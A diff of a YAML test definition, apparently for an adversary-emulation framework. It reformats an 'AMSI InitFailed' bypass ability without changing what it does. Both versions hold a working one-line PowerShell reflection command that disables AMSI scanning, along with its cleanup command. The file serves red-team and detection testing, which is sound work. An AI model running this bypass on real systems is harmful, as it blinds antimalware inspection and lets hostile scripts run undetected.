@@ -1,4 +1,4 @@
-- id: 9144f58d-9713-5a7b-989e-fae00a2424e1
+- requirements: []
   name: Soumaia ART Tests - AMSI Bypass - AMSI InitFailed
   description: 'Any easy way to bypass AMSI inspection is it patch the dll in memory setting the "amsiInitFailed" function to true.
 
@@ -7,13 +7,15 @@
 
     https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/'
   tactic: defense-impairment
-  technique:
-    attack_id: T1685
-    name: Disable or Modify Tools
-  platforms:
-    windows:
-      psh:
-        command: |-
-          [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-        cleanup: |-
-          [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)
+  technique_id: T1685
+  technique_name: Disable or Modify Tools
+  executors:
+  - cleanup:
+    - '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$false)'
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)'
+  id: 9144f58d-9713-5a7b-989e-fae00a2424e1
